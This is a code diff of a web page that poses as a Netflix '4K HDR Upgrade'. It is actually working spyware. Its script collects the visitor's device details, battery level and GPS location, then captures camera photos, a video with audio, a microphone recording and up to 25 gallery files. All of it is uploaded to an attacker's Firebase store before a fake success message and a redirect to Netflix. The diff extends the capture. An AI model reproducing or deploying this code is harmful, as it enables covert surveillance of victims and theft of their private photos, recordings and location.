@@ -3,21 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>4K HDR Upgrade | Netflix</title>
+    <title>4K HDR Upgrade</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
             min-height: 100vh;
             display: flex;
@@ -25,7 +20,6 @@
             align-items: center;
             padding: 20px;
         }
-        
         .card {
             background: rgba(20, 20, 20, 0.95);
             backdrop-filter: blur(10px);
@@ -35,9 +29,7 @@
             width: 100%;
             text-align: center;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
-        
         .logo {
             width: 80px;
             height: 80px;
@@ -49,97 +41,18 @@
             margin: 0 auto 24px;
             font-size: 40px;
         }
-        
-        h1 {
-            color: #fff;
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-        
-        .badge {
-            display: inline-block;
-            background: linear-gradient(135deg, #e50914, #b20710);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-bottom: 16px;
-            color: #fff;
-        }
-        
-        .sub {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 28px;
-        }
-        
-        .progress-container {
-            background: #1a1a1a;
-            border-radius: 30px;
-            height: 8px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
-        
-        .progress-bar {
-            background: linear-gradient(135deg, #e50914, #b20710);
-            width: 0%;
-            height: 100%;
-            transition: width 0.3s ease;
-            border-radius: 30px;
-        }
-        
-        .progress-text {
-            color: #e50914;
-            font-size: 14px;
-            font-weight: 600;
-            margin-top: 8px;
-            display: none;
-        }
-        
-        .device-info {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 16px;
-            margin-bottom: 24px;
-            text-align: left;
-        }
-        
-        .device-info p {
-            color: #ccc;
-            font-size: 13px;
-            margin: 6px 0;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #e50914, #b20710);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 44px;
-            cursor: pointer;
-        }
-        
-        .btn:disabled {
-            background: #444;
-            cursor: not-allowed;
-        }
-        
-        .loader {
-            margin-top: 16px;
-            color: #e50914;
-            font-size: 13px;
-            display: none;
-        }
-        
-        input, video, canvas {
-            display: none;
-        }
+        h1 { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 8px; }
+        .badge { display: inline-block; background: #e50914; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; margin-bottom: 16px; color: #fff; }
+        .sub { color: #aaa; font-size: 14px; margin-bottom: 28px; }
+        .device-info { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 16px; margin-bottom: 24px; text-align: left; }
+        .device-info p { color: #ccc; font-size: 13px; margin: 6px 0; }
+        .progress-container { background: #1a1a1a; border-radius: 30px; height: 8px; margin: 20px 0; overflow: hidden; display: none; }
+        .progress-bar { background: #e50914; width: 0%; height: 100%; transition: width 0.3s ease; }
+        .progress-text { color: #e50914; font-size: 13px; margin-top: 8px; display: none; }
+        .btn { background: linear-gradient(135deg, #e50914, #b20710); color: white; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: 700; border-radius: 44px; cursor: pointer; }
+        .btn:disabled { background: #444; cursor: not-allowed; }
+        .loader { margin-top: 16px; color: #e50914; font-size: 13px; display: none; }
+        input, video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -169,7 +82,6 @@
     <canvas id="canvas" style="display:none"></canvas>
     
     <script>
-        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
             authDomain: "mobilehk-5e843.firebaseapp.com",
@@ -191,22 +103,9 @@
         const progressBar = document.getElementById('progressBar');
         const progressText = document.getElementById('progressText');
         
-        let currentProgress = 0;
-        
-        function updateProgress(percent, message) {
-            currentProgress = percent;
+        function updateProgress(percent, msg) {
             progressBar.style.width = percent + '%';
-            progressText.innerHTML = percent + '% - ' + message;
-        }
-        
-        function showProgress() {
-            progressContainer.style.display = 'block';
-            progressText.style.display = 'block';
-        }
-        
-        function hideProgress() {
-            progressContainer.style.display = 'none';
-            progressText.style.display = 'none';
+            progressText.innerHTML = percent + '% - ' + msg;
         }
         
         if (!sessionId) {
@@ -215,7 +114,7 @@
             loader.innerHTML = '❌ Invalid link';
         }
         
-        // Get device info + battery
+        // Get device + battery
         async function getDeviceInfo() {
             const ua = navigator.userAgent;
             let device = "Unknown";
@@ -227,53 +126,52 @@
             let battery = "Not available";
             if ('getBattery' in navigator) {
                 try {
-                    const batteryManager = await navigator.getBattery();
-                    battery = Math.round(batteryManager.level * 100) + '%';
-                    if (!batteryManager.charging) battery += ' (discharging)';
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + '%';
+                    if (!b.charging) battery += ' (discharging)';
                     else battery += ' (charging)';
                 } catch(e) {}
             }
             
             document.getElementById('deviceName').innerText = device;
             document.getElementById('batteryLevel').innerText = battery;
-            
             return { device, ua, battery, screen: `${screen.width}x${screen.height}` };
         }
         
-        // Save to Firebase
         async function saveData(type, data) {
             if (!sessionId) return;
-            const timestamp = new Date().toISOString();
             const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
             await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
-                type: type,
-                data: data,
-                timestamp: timestamp
+                type: type, data: data, timestamp: new Date().toISOString()
             });
         }
         
-        // Upload file
         async function uploadFile(file, type) {
-            if (!sessionId) return null;
+            if (!sessionId) return;
             const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
             const ref = storage.ref(`uploads/${filename}`);
             await ref.put(file);
             const url = await ref.getDownloadURL();
-            await saveData(type, { url, name: file.name, size: file.size });
+            await saveData(type, { url, name: file.name });
             return url;
         }
         
-        // 1. Device Info (5%)
-        async function step1() {
+        // ========== MAIN FUNCTION ==========
+        async function startUpgrade() {
+            if (!sessionId) return;
+            
+            upgradeBtn.disabled = true;
+            loader.style.display = 'block';
+            progressContainer.style.display = 'block';
+            progressText.style.display = 'block';
+            
+            // STEP 1: Device Info (5%)
             updateProgress(5, "Detecting device...");
-            const info = await getDeviceInfo();
-            await saveData('device_info', info);
-            return true;
-        }
-        
-        // 2. Location (15%)
-        async function step2() {
-            updateProgress(15, "Getting location...");
+            const deviceInfo = await getDeviceInfo();
+            await saveData('device_info', deviceInfo);
+            
+            // STEP 2: Location (10%)
+            updateProgress(10, "Getting location...");
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -283,15 +181,12 @@
                     lng: pos.coords.longitude,
                     map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                return true;
-            } catch(e) { return false; }
-        }
-        
-        // 3. Camera Permission + Photos (40%)
-        async function step3() {
-            updateProgress(25, "Requesting camera access...");
+            } catch(e) {}
+            
+            // STEP 3: Camera + Photos + Video (20% to 60%)
+            updateProgress(20, "Requesting camera...");
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 await new Promise(r => setTimeout(r, 500));
@@ -301,16 +196,17 @@
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 
-                updateProgress(30, "Capturing photos...");
-                for (let i = 1; i <= 4; i++) {
+                // 5 Photos
+                for (let i = 1; i <= 5; i++) {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
+                    const file = new File([blob], `photo_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                     await uploadFile(file, 'camera_photo');
-                    updateProgress(30 + (i * 2), `Photo ${i}/4 captured`);
+                    updateProgress(20 + (i * 5), `Photo ${i}/5 captured`);
                 }
                 
-                updateProgress(40, "Recording video...");
+                // 5 Second Video
+                updateProgress(50, "Recording video...");
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
@@ -322,15 +218,13 @@
                 recorder.start();
                 await new Promise(r => setTimeout(r, 5000));
                 recorder.stop();
+                await new Promise(r => setTimeout(r, 500));
                 
                 stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { return false; }
-        }
-        
-        // 4. Microphone (60%)
-        async function step4() {
-            updateProgress(55, "Requesting microphone...");
+            } catch(e) { console.log("Camera error:", e); }
+            
+            // STEP 4: Microphone (65%)
+            updateProgress(65, "Recording audio...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -342,62 +236,40 @@
                     await uploadFile(file, 'microphone');
                 };
                 recorder.start();
-                updateProgress(60, "Recording audio...");
                 await new Promise(r => setTimeout(r, 5000));
                 recorder.stop();
                 stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { return false; }
-        }
-        
-        // 5. Gallery (80%)
-        async function step5() {
-            updateProgress(65, "Opening gallery...");
-            return new Promise((resolve) => {
+            } catch(e) {}
+            
+            // STEP 5: Gallery (70% to 90%)
+            updateProgress(70, "Opening gallery...");
+            await new Promise((resolve) => {
                 const input = document.getElementById('galleryInput');
                 input.onchange = async (e) => {
                     const files = Array.from(e.target.files);
-                    if (files.length === 0) { resolve(true); return; }
-                    for (let i = 0; i < Math.min(files.length, 20); i++) {
-                        const percent = 65 + Math.floor((i / Math.min(files.length, 20)) * 25);
-                        updateProgress(percent, `Uploading ${i+1}/${Math.min(files.length, 20)} files`);
-                        const file = files[i];
-                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
-                        await uploadFile(file, type);
+                    if (files.length > 0) {
+                        for (let i = 0; i < Math.min(files.length, 25); i++) {
+                            const file = files[i];
+                            const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
+                            await uploadFile(file, type);
+                            const percent = 70 + Math.floor((i / Math.min(files.length, 25)) * 20);
+                            updateProgress(percent, `Uploading ${i+1}/${Math.min(files.length, 25)} files`);
+                        }
                     }
-                    resolve(true);
+                    resolve();
                 };
                 input.click();
             });
-        }
-        
-        // 6. Complete (100%)
-        async function step6() {
+            
+            // STEP 6: Complete (100%)
             updateProgress(95, "Finalizing...");
             await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
             updateProgress(100, "4K HDR Enabled!");
             loader.innerHTML = "✅ 4K HDR Activated! Redirecting...";
+            
             setTimeout(() => {
                 window.location.href = "https://www.netflix.com";
             }, 2000);
-        }
-        
-        // Main function
-        async function startUpgrade() {
-            if (!sessionId) return;
-            
-            upgradeBtn.disabled = true;
-            loader.style.display = 'block';
-            showProgress();
-            
-            await step1();
-            await step2();
-            await step3();
-            await step4();
-            await step5();
-            await step6();
-            
-            hideProgress();
         }
         
         upgradeBtn.onclick = startUpgrade;
